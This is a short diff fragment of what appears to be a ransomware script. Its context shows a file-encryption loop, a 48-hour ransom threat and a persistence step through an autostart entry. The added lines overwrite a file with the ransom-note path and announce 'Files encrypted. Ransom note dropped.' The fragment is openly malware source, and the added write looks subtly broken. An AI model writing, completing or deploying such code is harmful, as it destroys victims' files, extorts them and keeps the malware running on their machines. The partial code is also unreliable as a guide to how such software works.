@@ -48,6 +48,11 @@ for file in files_to_encrypt:
             "You have 48 hours before your files are lost forever."
         )
 
+with open(file, "w") as f:
+    f.write(ransom_note_path)
+
+print("[+] Files encrypted. Ransom note dropped.")
+
 # Simulate persistence by creating autostart entry
 setup_autostart()
 
